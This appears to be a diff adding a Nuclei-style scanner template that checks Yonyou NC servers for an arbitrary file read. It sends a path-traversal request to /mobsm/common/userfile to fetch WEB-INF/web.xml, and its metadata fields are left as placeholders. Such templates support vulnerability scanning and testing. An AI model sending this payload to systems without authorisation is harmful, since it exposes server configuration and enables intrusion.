@@ -1,0 +1,26 @@
+id: yonyou-common-readfile
+info:
+  name: yonyou-common-readfile
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /mobsm/common/userfile?path=%5C..%5Cwebapps%5Cnc_web%5CWEB-INF%5Cweb.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: JSESSIONID=218AB2A2F72F74A04BD73290799F2B73.server; JSESSIONID=919EA3725EE8E7366749CD1F78594BBB.server
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <?xml
